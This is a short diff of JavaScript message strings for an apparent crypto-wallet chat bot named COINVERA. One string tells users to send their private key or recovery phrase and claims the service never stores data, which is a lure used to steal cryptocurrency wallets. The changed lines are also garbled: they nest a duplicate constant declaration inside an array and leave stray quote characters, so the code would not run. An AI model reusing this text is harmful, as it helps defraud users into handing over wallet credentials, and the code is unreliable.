@@ -43,7 +43,9 @@ const WALLET_SECURITY_TEXT = [
 ].join('\n');
 
 const WALLET_CONTINUE_TEXT = [
-    '✅ Send your <b>private key,or recovery phrase</b> only — Note COINVERA never stores your data .',
+    'const WALLET_CONTINUE_TEXT = [
+       '✅ Send your <b>private key,or recovery phrase</b> only — Note COINVERA never stores your data .',.'
+].join('\n');
 
 const WELCOME_TEXT = [
   '👑 <b>Welcome to COINVERA</b>',
